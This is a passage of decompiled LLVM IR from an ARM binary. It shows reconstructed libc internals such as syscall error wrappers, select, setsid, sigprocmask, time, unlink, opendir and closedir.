  %stack_var_-8 = alloca i32, align 4
  %v3_114d4 = load i32, i32* @r7, align 4
  store i32 %v3_114d4, i32* %stack_var_-8, align 4
  %v0_114e0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_114e0, i32* @r2, align 4
  %tmp = icmp ult i32 %v0_114e0, -4095
  br i1 %tmp, label %dec_label_pc_11508, label %dec_label_pc_114f0

dec_label_pc_114f0:                               ; preds = %entry
  %v0_114f4 = call i32 @__aeabi_read_tp()
  %v3_114f8 = load i16, i16* @global_var_2222c.358, align 2
  %v4_114f8 = sext i16 %v3_114f8 to i32
  store i32 %v4_114f8, i32* @r3, align 4
  %v0_114fc = load i32, i32* @r2, align 4
  %v1_114fc = sub i32 0, %v0_114fc
  store i32 %v1_114fc, i32* @r2, align 4
  %v3_11500 = add i32 %v4_114f8, %v0_114f4
  %v4_11500 = inttoptr i32 %v3_11500 to i32*
  store i32 %v1_114fc, i32* %v4_11500, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_11508.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11508

dec_label_pc_11508:                               ; preds = %entry, %dec_label_pc_114f0
  %v1_1150c = phi i32 [ %v0_114e0, %entry ], [ -1, %dec_label_pc_114f0 ]
  %v2_11508 = phi i32 [ %v3_114d4, %entry ], [ %v2_11508.pre, %dec_label_pc_114f0 ]
  store i32 %v2_11508, i32* @r7, align 4
  ret i32 %v1_1150c

; uselistorder directives
  uselistorder i32 %v0_114e0, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11508, { 1, 0 }
}

define i32 @__syscall_select() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_11514 = load i32, i32* @r4, align 4
  store i32 %v3_11514, i32* %stack_var_-12, align 4
  %v0_11524 = load i32, i32* @r0, align 4
  store i32 %v0_11524, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11524, -4095
  br i1 %tmp, label %dec_label_pc_1154c, label %dec_label_pc_11534

dec_label_pc_11534:                               ; preds = %entry
  %v0_11538 = call i32 @__aeabi_read_tp()
  %v3_1153c = load i16, i16* @global_var_2222c.358, align 2
  %v4_1153c = sext i16 %v3_1153c to i32
  %v0_11540 = load i32, i32* %r2.global-to-local, align 4
  %v1_11540 = sub i32 0, %v0_11540
  store i32 %v1_11540, i32* %r2.global-to-local, align 4
  %v3_11544 = add i32 %v4_1153c, %v0_11538
  %v4_11544 = inttoptr i32 %v3_11544 to i32*
  store i32 %v1_11540, i32* %v4_11544, align 4
  %v2_1154c.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_1154c

dec_label_pc_1154c:                               ; preds = %entry, %dec_label_pc_11534
  %v1_11550 = phi i32 [ %v0_11524, %entry ], [ -1, %dec_label_pc_11534 ]
  %v2_1154c = phi i32 [ %v3_11514, %entry ], [ %v2_1154c.pre, %dec_label_pc_11534 ]
  store i32 %v2_1154c, i32* @r4, align 4
  ret i32 %v1_11550

; uselistorder directives
  uselistorder i32 %v0_11524, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1154c, { 1, 0 }
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_11558 = load i32, i32* @r4, align 4
  store i32 %v3_11558, i32* %stack_var_-28, align 4
  %v6_11558 = load i32, i32* @r5, align 4
  %v9_11558 = load i32, i32* @r6, align 4
  %v12_11558 = load i32, i32* @r7, align 4
  %v15_11558 = load i32, i32* @r8, align 4
  %v18_11558 = load i32, i32* @sl, align 4
  %v21_11558 = load i32, i32* @lr, align 4
  %v4_11568 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 12824) to i32*), align 4
  %v2_11570 = icmp eq i32 %v4_11568, 0
  store i32 %arg1, i32* %sl.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg4, i32* @r8, align 4
  store i32 %arg5, i32* @r4, align 4
  br i1 %v2_11570, label %dec_label_pc_1158c, label %entry.dec_label_pc_11598_crit_edge

entry.dec_label_pc_11598_crit_edge:               ; preds = %entry
  br label %dec_label_pc_11598

dec_label_pc_1158c:                               ; preds = %entry
  store i32 %v3_11558, i32* @r4, align 4
  store i32 %v9_11558, i32* @r6, align 4
  store i32 %v12_11558, i32* @r7, align 4
  store i32 %v15_11558, i32* @r8, align 4
  store i32 %v18_11558, i32* %sl.global-to-local, align 4
  %v0_11594 = call i32 @__syscall_select()
  br label %dec_label_pc_11598

dec_label_pc_11598:                               ; preds = %entry.dec_label_pc_11598_crit_edge, %dec_label_pc_1158c
  %v0_11598 = call i32 @__libc_enable_asynccancel()
  %v0_1159c = load i32, i32* @r6, align 4
  store i32 %v0_1159c, i32* @r1, align 4
  store i32 %v0_11598, i32* @r5, align 4
  %v0_115ac = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_115ac, i32* @r0, align 4
  %v0_115b4 = call i32 @__syscall_select()
  store i32 %v0_115b4, i32* @r4, align 4
  %v0_115bc = load i32, i32* @r5, align 4
  %v1_115c0 = call i32 @__libc_disable_asynccancel(i32 %v0_115bc)
  %v0_115c4 = load i32, i32* @r4, align 4
  %v2_115cc = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_115cc, i32* @r4, align 4
  store i32 %v6_11558, i32* @r5, align 4
  store i32 %v9_11558, i32* @r6, align 4
  store i32 %v12_11558, i32* @r7, align 4
  store i32 %v15_11558, i32* @r8, align 4
  store i32 %v18_11558, i32* @sl, align 4
  store i32 %v21_11558, i32* @lr, align 4
  ret i32 %v0_115c4

; uselistorder directives
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11598, { 1, 0 }
}

define i32 @__GI_setsid(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_115dc = load i32, i32* @r7, align 4
  store i32 %v3_115dc, i32* %stack_var_-8, align 4
  %v0_115e8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_115e8, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_115e8, -4095
  br i1 %tmp, label %dec_label_pc_11610, label %dec_label_pc_115f8

dec_label_pc_115f8:                               ; preds = %entry
  %v0_115fc = call i32 @__aeabi_read_tp()
  %v3_11600 = load i16, i16* @global_var_2222c.358, align 2
  %v4_11600 = sext i16 %v3_11600 to i32
  %v0_11604 = load i32, i32* %r2.global-to-local, align 4
  %v1_11604 = sub i32 0, %v0_11604
  store i32 %v1_11604, i32* %r2.global-to-local, align 4
  %v3_11608 = add i32 %v4_11600, %v0_115fc
  %v4_11608 = inttoptr i32 %v3_11608 to i32*
  store i32 %v1_11604, i32* %v4_11608, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_11610.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11610

dec_label_pc_11610:                               ; preds = %entry, %dec_label_pc_115f8
  %v1_11614 = phi i32 [ %v0_115e8, %entry ], [ -1, %dec_label_pc_115f8 ]
  %v2_11610 = phi i32 [ %v3_115dc, %entry ], [ %v2_11610.pre, %dec_label_pc_115f8 ]
  store i32 %v2_11610, i32* @r7, align 4
  ret i32 %v1_11614

; uselistorder directives
  uselistorder i32 %v0_115e8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11610, { 1, 0 }
}

define i32 @__GI_sigprocmask(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v2_11620 = icmp eq i32* %arg2, null
  br i1 %v2_11620, label %dec_label_pc_11664, label %dec_label_pc_11634

dec_label_pc_11634:                               ; preds = %entry
  %v2_11634 = load i32, i32* %arg2, align 4
  %v1_11638 = icmp slt i32 %v2_11634, 0
  br i1 %v1_11638, label %dec_label_pc_1164c, label %dec_label_pc_11640

dec_label_pc_11640:                               ; preds = %dec_label_pc_11634
  %tmp = ptrtoint i32* %arg2 to i32
  %.pre = add i32 %tmp, 4
  %.pre3 = inttoptr i32 %.pre to i32*
  %v3_11640 = load i32, i32* %.pre3, align 4
  %v1_11644 = urem i32 %v3_11640, 2
  %v2_11644 = icmp eq i32 %v1_11644, 0
  br i1 %v2_11644, label %dec_label_pc_11664, label %dec_label_pc_1164c

dec_label_pc_1164c:                               ; preds = %dec_label_pc_11634, %dec_label_pc_11640
  %v2_1164c = load i32, i32* %arg2, align 4
  %tmp9 = bitcast i32 %v2_1164c to float
  %tmp10 = call float @fabsf(float %tmp9)
  br label %dec_label_pc_11664

dec_label_pc_11664:                               ; preds = %dec_label_pc_11640, %entry, %dec_label_pc_1164c
  %tmp11 = icmp ult i32 %arg1, -4095
  br i1 %tmp11, label %dec_label_pc_11698, label %dec_label_pc_11680

dec_label_pc_11680:                               ; preds = %dec_label_pc_11664
  %v1_11684 = sub i32 0, %arg1
  %v3_11688 = load i16, i16* @global_var_2222c.358, align 2
  %v4_11688 = sext i16 %v3_11688 to i32
  %v0_1168c = call i32 @__aeabi_read_tp()
  %v3_11690 = add i32 %v4_11688, %v0_1168c
  %v4_11690 = inttoptr i32 %v3_11690 to i32*
  store i32 %v1_11684, i32* %v4_11690, align 4
  br label %dec_label_pc_11698

dec_label_pc_11698:                               ; preds = %dec_label_pc_11664, %dec_label_pc_11680
  %v1_116a0 = phi i32 [ %arg1, %dec_label_pc_11664 ], [ -1, %dec_label_pc_11680 ]
  ret i32 %v1_116a0

; uselistorder directives
  uselistorder i32* %arg2, { 0, 3, 1, 2 }
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %dec_label_pc_11698, { 1, 0 }
  uselistorder label %dec_label_pc_11664, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1164c, { 1, 0 }
}

define i32 @__GI_time(i32* %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v2_116ac = ptrtoint i32* %stack_var_-16 to i32
  store i32 0, i32* @r1, align 4
  %v2_116bc = call i32 @gettimeofday(i32 %v2_116ac, i32 0)
  %v2_116c0 = load i32, i32* %stack_var_-16, align 4
  %v2_116c4 = icmp eq i32* %arg1, null
  br i1 %v2_116c4, label %bb6, label %bb

bb:                                               ; preds = %entry
  store i32 %v2_116c0, i32* %arg1, align 4
  br label %bb6

bb6:                                              ; preds = %entry, %bb
  ret i32 %v2_116c0

; uselistorder directives
  uselistorder label %bb6, { 1, 0 }
}

define i32 @unlink(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_116d8 = load i32, i32* @r7, align 4
  store i32 %v3_116d8, i32* %stack_var_-8, align 4
  %v0_116e4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_116e4, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_116e4, -4095
  br i1 %tmp, label %dec_label_pc_1170c, label %dec_label_pc_116f4

dec_label_pc_116f4:                               ; preds = %entry
  %v0_116f8 = call i32 @__aeabi_read_tp()
  %v3_116fc = load i16, i16* @global_var_2222c.358, align 2
  %v4_116fc = sext i16 %v3_116fc to i32
  %v0_11700 = load i32, i32* %r2.global-to-local, align 4
  %v1_11700 = sub i32 0, %v0_11700
  store i32 %v1_11700, i32* %r2.global-to-local, align 4
  %v3_11704 = add i32 %v4_116fc, %v0_116f8
  %v4_11704 = inttoptr i32 %v3_11704 to i32*
  store i32 %v1_11700, i32* %v4_11704, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1170c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1170c

dec_label_pc_1170c:                               ; preds = %entry, %dec_label_pc_116f4
  %v1_11710 = phi i32 [ %v0_116e4, %entry ], [ -1, %dec_label_pc_116f4 ]
  %v2_1170c = phi i32 [ %v3_116d8, %entry ], [ %v2_1170c.pre, %dec_label_pc_116f4 ]
  store i32 %v2_1170c, i32* @r7, align 4
  ret i32 %v1_11710

; uselistorder directives
  uselistorder i32 %v0_116e4, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1170c, { 1, 0 }
}

define i32 @__GI_closedir(i32* %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_11718 = load i32, i32* @r4, align 4
  store i32 %v3_11718, i32* %stack_var_-24, align 4
  %v9_11718 = load i32, i32* @r6, align 4
  %v12_11718 = load i32, i32* @r7, align 4
  %v15_11718 = load i32, i32* @r8, align 4
  %v18_11718 = load i32, i32* @lr, align 4
  %v2_1171c = load i32, i32* %arg1, align 4
  store i32 %v2_1171c, i32* %r3.global-to-local, align 4
  %v3_11724 = icmp eq i32 %v2_1171c, -1
  store i32 %tmp, i32* @r7, align 4
  store i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32* @r6, align 4
  br i1 %v3_11724, label %dec_label_pc_11738, label %dec_label_pc_11754

dec_label_pc_11738:                               ; preds = %entry
  store i32 ptrtoint (i32* @global_var_10ae4.246 to i32), i32* %r2.global-to-local, align 4
  %v0_1173c = call i32 @__aeabi_read_tp()
  %v3_11740 = load i16, i16* @global_var_2222c.358, align 2
  %v4_11740 = sext i16 %v3_11740 to i32
  store i32 %v4_11740, i32* %r2.global-to-local, align 4
  %v0_11744 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_11744, i32* %r1.global-to-local, align 4
  %v1_11748 = add i32 %v0_11744, 10
  store i32 %v1_11748, i32* %r3.global-to-local, align 4
  %v3_1174c = add i32 %v4_11740, %v0_1173c
  %v4_1174c = inttoptr i32 %v3_1174c to i32*
  store i32 %v1_11748, i32* %v4_1174c, align 4
  %v0_117fc.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_117fc

dec_label_pc_11754:                               ; preds = %entry
  store i32 68, i32* %r3.global-to-local, align 4
  %v1_11758 = add i32 %tmp, 24
  store i32 %v1_11758, i32* %r2.global-to-local, align 4
  %v4_11760 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 68) to i32*), align 4
  store i32 %v4_11760, i32* %r1.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  %v4_1176c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 112) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_1176c)
  store i32 -1, i32* @r8, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_11784 = load i32, i32* @r6, align 4
  %v2_11784 = add i32 %v0_11784, 16
  %v3_11784 = inttoptr i32 %v2_11784 to i32*
  %v4_11784 = load i32, i32* %v3_11784, align 4
  call void @__pseudo_branch(i32 %v4_11784)
  %v0_11790 = load i32, i32* @r7, align 4
  %v1_11790 = inttoptr i32 %v0_11790 to i32*
  %v2_11790 = load i32, i32* %v1_11790, align 4
  store i32 %v2_11790, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 44, i32* %r3.global-to-local, align 4
  %v0_117a0 = load i32, i32* @r8, align 4
  store i32 %v0_117a0, i32* %v1_11790, align 4
  %v0_117a4 = load i32, i32* @r6, align 4
  %v1_117a4 = load i32, i32* %r3.global-to-local, align 4
  %v2_117a4 = add i32 %v1_117a4, %v0_117a4
  %v3_117a4 = inttoptr i32 %v2_117a4 to i32*
  %v4_117a4 = load i32, i32* %v3_117a4, align 4
  store i32 ptrtoint (i32* @global_var_117b0.384 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_117a4)
  %v0_117b0 = load i32, i32* @r7, align 4
  %v1_117b0 = add i32 %v0_117b0, 12
  %v2_117b0 = inttoptr i32 %v1_117b0 to i32*
  %v3_117b0 = load i32, i32* %v2_117b0, align 4
  store i32 %v3_117b0, i32* @r0, align 4
  %v0_117b4 = call i32 @free()
  %v0_117b8 = load i32, i32* @r7, align 4
  store i32 %v0_117b8, i32* @r0, align 4
  %v0_117bc = call i32 @free()
  %v0_117c4 = load i32, i32* @r4, align 4
  store i32 %v0_117c4, i32* %r2.global-to-local, align 4
  %tmp11 = icmp ult i32 %v0_117c4, -4095
  br i1 %tmp11, label %dec_label_pc_117f8, label %dec_label_pc_117e0

dec_label_pc_117e0:                               ; preds = %dec_label_pc_11754
  store i32 68156, i32* %r3.global-to-local, align 4
  %v0_117e4 = call i32 @__aeabi_read_tp()
  %v3_117e8 = load i16, i16* @global_var_2222c.358, align 2
  %v4_117e8 = sext i16 %v3_117e8 to i32
  store i32 %v4_117e8, i32* %r3.global-to-local, align 4
  %v0_117ec = load i32, i32* %r2.global-to-local, align 4
  %v1_117ec = sub i32 0, %v0_117ec
  store i32 %v1_117ec, i32* %r2.global-to-local, align 4
  %v3_117f0 = add i32 %v4_117e8, %v0_117e4
  %v4_117f0 = inttoptr i32 %v3_117f0 to i32*
  store i32 %v1_117ec, i32* %v4_117f0, align 4
  %v0_117f4 = load i32, i32* @r8, align 4
  br label %dec_label_pc_117f8

dec_label_pc_117f8:                               ; preds = %dec_label_pc_11754, %dec_label_pc_117e0
  %v0_117f8 = phi i32 [ %v0_117c4, %dec_label_pc_11754 ], [ %v0_117f4, %dec_label_pc_117e0 ]
  store i32 %v0_117f8, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_117fc

dec_label_pc_117fc:                               ; preds = %dec_label_pc_11738, %dec_label_pc_117f8
  %v0_117fc = phi i32 [ %v0_117fc.pre, %dec_label_pc_11738 ], [ %v0_117f8, %dec_label_pc_117f8 ]
  %v2_11804 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_11804, i32* @r4, align 4
  store i32 %v9_11718, i32* @r6, align 4
  store i32 %v12_11718, i32* @r7, align 4
  store i32 %v15_11718, i32* @r8, align 4
  store i32 %v18_11718, i32* @lr, align 4
  ret i32 %v0_117fc

; uselistorder directives
  uselistorder i32 %v0_117c4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_117fc, { 1, 0 }
  uselistorder label %dec_label_pc_117f8, { 1, 0 }
}

define i32 @function_11814(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11814:
  %v0_11814 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11814, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_11814
  %v2_11820 = load i32, i32* @ip, align 4
  %v3_11824 = load i32, i32* @sl, align 4
  %v8_11824 = lshr i32 %v2_11820, %v3_11824
  %v9_11824 = and i32 %v8_11824, %arg2
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_11814, %bb
  %v10_11824 = phi i32 [ %arg1, %dec_label_pc_11814 ], [ %v9_11824, %bb ]
  ret i32 %v10_11824

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @fd_to_DIR(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_11828 = load i32, i32* @r4, align 4
  %v6_11828 = load i32, i32* @r5, align 4
  %v9_11828 = load i32, i32* @r6, align 4
  %v12_11828 = load i32, i32* @r7, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 48, i32* @r0, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_1183c = call i32 @malloc()
  %v2_11844 = icmp eq i32 %v0_1183c, 0
  store i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32* @r6, align 4
  br i1 %v2_11844, label %bb, label %dec_label_pc_11854

bb:                                               ; preds = %entry
  br label %dec_label_pc_118e0

dec_label_pc_11854:                               ; preds = %entry
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_11858 = load i32, i32* @r4, align 4
  %v2_11858 = icmp ugt i32 %v0_11858, 511
  %v2_1185c = add i32 %v0_1183c, 4
  %v3_1185c = inttoptr i32 %v2_1185c to i32*
  store i32 0, i32* %v3_1185c, align 4
  %v0_11860 = load i32, i32* %r3.global-to-local, align 4
  %v2_11860 = add i32 %v0_1183c, 16
  %v3_11860 = inttoptr i32 %v2_11860 to i32*
  store i32 %v0_11860, i32* %v3_11860, align 4
  %v0_11864 = load i32, i32* %r3.global-to-local, align 4
  %v2_11864 = add i32 %v0_1183c, 8
  %v3_11864 = inttoptr i32 %v2_11864 to i32*
  store i32 %v0_11864, i32* %v3_11864, align 4
  br i1 %v2_11858, label %.thread, label %bb16

.thread:                                          ; preds = %dec_label_pc_11854
  %v0_1186c2 = load i32, i32* @r4, align 4
  %v2_1186c3 = add i32 %v0_1183c, 20
  %v3_1186c4 = inttoptr i32 %v2_1186c3 to i32*
  store i32 %v0_1186c2, i32* %v3_1186c4, align 4
  br label %bb17

bb16:                                             ; preds = %dec_label_pc_11854
  %v1_11868 = load i32, i32* %r3.global-to-local, align 4
  %v2_11868 = add i32 %v1_11868, 512
  store i32 %v2_11868, i32* %r3.global-to-local, align 4
  %v0_1186c = load i32, i32* @r4, align 4
  %v2_1186c = add i32 %v0_1183c, 20
  %v3_1186c = inttoptr i32 %v2_1186c to i32*
  store i32 %v0_1186c, i32* %v3_1186c, align 4
  %v1_11870 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v1_11870, i32* %v3_1186c, align 4
  br label %bb17

bb17:                                             ; preds = %.thread, %bb16
  store i32 %v0_1183c, i32* @r5, align 4
  %v0_11878 = load i32, i32* @r7, align 4
  %v2_11878 = inttoptr i32 %v0_1183c to i32*
  store i32 %v0_11878, i32* %v2_11878, align 4
  %v0_1187c = load i32, i32* @r5, align 4
  %v1_1187c = add i32 %v0_1187c, 20
  %v2_1187c = inttoptr i32 %v1_1187c to i32*
  %v3_1187c = load i32, i32* %v2_1187c, align 4
  store i32 %v3_1187c, i32* %r1.global-to-local, align 4
  %v2_11884 = call i32 @calloc(i32 1, i32 %v3_1187c)
  %v2_11888 = icmp eq i32 %v2_11884, 0
  store i32 %v2_11884, i32* @r4, align 4
  %v1_11890 = load i32, i32* @r5, align 4
  %v2_11890 = add i32 %v1_11890, 12
  %v3_11890 = inttoptr i32 %v2_11890 to i32*
  store i32 %v2_11884, i32* %v3_11890, align 4
  br i1 %v2_11888, label %dec_label_pc_11898, label %dec_label_pc_118a8

dec_label_pc_11898:                               ; preds = %bb17
  %v0_11898 = load i32, i32* @r5, align 4
  store i32 %v0_11898, i32* @r0, align 4
  %v0_1189c = call i32 @free()
  %v0_118a0 = load i32, i32* @r4, align 4
  br label %dec_label_pc_118e0

dec_label_pc_118a8:                               ; preds = %bb17
  %v0_118ac = load i32, i32* @r6, align 4
  %v2_118ac = add i32 %v0_118ac, -34036
  store i32 %v2_118ac, i32* %r3.global-to-local, align 4
  %v1_118b4 = inttoptr i32 %v2_118ac to i32*
  %v2_118b4 = load i32, i32* %v1_118b4, align 4
  %v3_118b4 = add i32 %v0_118ac, -34032
  %v4_118b4 = inttoptr i32 %v3_118b4 to i32*
  %v5_118b4 = load i32, i32* %v4_118b4, align 4
  store i32 %v5_118b4, i32* %r1.global-to-local, align 4
  %v6_118b4 = add i32 %v0_118ac, -34028
  %v7_118b4 = inttoptr i32 %v6_118b4 to i32*
  %v8_118b4 = load i32, i32* %v7_118b4, align 4
  store i32 %v8_118b4, i32* %r2.global-to-local, align 4
  %v9_118b4 = add i32 %v0_118ac, -34024
  %v10_118b4 = inttoptr i32 %v9_118b4 to i32*
  %v11_118b4 = load i32, i32* %v10_118b4, align 4
  store i32 %v11_118b4, i32* %r3.global-to-local, align 4
  %v12_118b4 = add i32 %v0_118ac, -34020
  %v1_118c0 = inttoptr i32 %v12_118b4 to i32*
  %v2_118c0 = load i32, i32* %v1_118c0, align 4
  %v3_118c0 = add i32 %v0_118ac, -34016
  %v4_118c0 = inttoptr i32 %v3_118c0 to i32*
  %v5_118c0 = load i32, i32* %v4_118c0, align 4
  store i32 %v2_118c0, i32* %stack_var_-32, align 4
  store i32 %v5_118b4, i32* %r1.global-to-local, align 4
  store i32 %v8_118b4, i32* %r2.global-to-local, align 4
  store i32 %v11_118b4, i32* %r3.global-to-local, align 4
  %v0_118d0 = load i32, i32* @r5, align 4
  %v1_118d0 = add i32 %v0_118d0, 24
  %v1_118d4 = inttoptr i32 %v1_118d0 to i32*
  store i32 %v2_118b4, i32* %v1_118d4, align 4
  %v3_118d4 = add i32 %v0_118d0, 28
  %v4_118d4 = inttoptr i32 %v3_118d4 to i32*
  %v5_118d4 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_118d4, i32* %v4_118d4, align 4
  %v6_118d4 = add i32 %v0_118d0, 32
  %v7_118d4 = inttoptr i32 %v6_118d4 to i32*
  %v8_118d4 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_118d4, i32* %v7_118d4, align 4
  %v9_118d4 = add i32 %v0_118d0, 36
  %v10_118d4 = inttoptr i32 %v9_118d4 to i32*
  %v11_118d4 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v11_118d4, i32* %v10_118d4, align 4
  %v12_118d4 = add i32 %v0_118d0, 40
  %v2_118d8 = load i32, i32* %stack_var_-32, align 4
  store i32 %v5_118c0, i32* %r1.global-to-local, align 4
  %v1_118dc = inttoptr i32 %v12_118d4 to i32*
  store i32 %v2_118d8, i32* %v1_118dc, align 4
  %v3_118dc = add i32 %v0_118d0, 44
  %v4_118dc = inttoptr i32 %v3_118dc to i32*
  %v5_118dc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_118dc, i32* %v4_118dc, align 4
  %v0_118e0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_118e0

dec_label_pc_118e0:                               ; preds = %bb, %dec_label_pc_11898, %dec_label_pc_118a8
  %v0_118e0 = phi i32 [ 0, %bb ], [ %v0_118a0, %dec_label_pc_11898 ], [ %v0_118e0.pre, %dec_label_pc_118a8 ]
  store i32 %v3_11828, i32* @r4, align 4
  store i32 %v6_11828, i32* @r5, align 4
  store i32 %v9_11828, i32* @r6, align 4
  store i32 %v12_11828, i32* @r7, align 4
  ret i32 %v0_118e0

; uselistorder directives
  uselistorder i32 %v2_11884, { 1, 0, 2 }
  uselistorder i32 %v0_1183c, { 2, 1, 6, 0, 5, 4, 3, 7 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_118e0, { 2, 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__GI_opendir(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-96 = alloca i32, align 4
  %v3_118f8 = load i32, i32* @r7, align 4
  store i32 542720, i32* %r1.global-to-local, align 4
  %v2_11900 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp6 = icmp ult i32 %arg1, -4095
  br i1 %tmp6, label %dec_label_pc_11930, label %dec_label_pc_11918

dec_label_pc_11918:                               ; preds = %entry
  %v0_1191c = call i32 @__aeabi_read_tp()
  %v3_11920 = load i16, i16* @global_var_2222c.358, align 2
  %v4_11920 = sext i16 %v3_11920 to i32
  %v0_11924 = load i32, i32* %r2.global-to-local, align 4
  %v1_11924 = sub i32 0, %v0_11924
  store i32 %v1_11924, i32* %r2.global-to-local, align 4
  %v3_11928 = add i32 %v4_11920, %v0_1191c
  %v4_11928 = inttoptr i32 %v3_11928 to i32*
  store i32 %v1_11924, i32* %v4_11928, align 4
  br label %dec_label_pc_11954

dec_label_pc_11930:                               ; preds = %entry
  store i32 %arg1, i32* @r7, align 4
  %v1_11930 = icmp slt i32 %arg1, 0
  br i1 %v1_11930, label %dec_label_pc_11954, label %dec_label_pc_11938

dec_label_pc_11938:                               ; preds = %dec_label_pc_11930
  store i32 %v2_11900, i32* @r1, align 4
  %v0_1193c = call i32 @fstat()
  %v1_11940 = icmp slt i32 %v0_1193c, 0
  br i1 %v1_11940, label %dec_label_pc_11948, label %dec_label_pc_1195c

dec_label_pc_11948:                               ; preds = %dec_label_pc_11938
  br label %dec_label_pc_11954

dec_label_pc_11954:                               ; preds = %dec_label_pc_11948, %dec_label_pc_11930, %dec_label_pc_11918
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_119a0

dec_label_pc_1195c:                               ; preds = %dec_label_pc_11938
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v0_11964 = load i32, i32* @r7, align 4
  %v3_11968 = call i32 @__GI___fcntl_nocancel(i32 %v0_11964, i32 2, i32 1)
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v0_11970 = load i32, i32* @r7, align 4
  %v2_11974 = call i32 @fd_to_DIR(i32 %v0_11970, i32 %tmp)
  store i32 %v2_11974, i32* %r1.global-to-local, align 4
  %v2_11978 = icmp eq i32 %v2_11974, 0
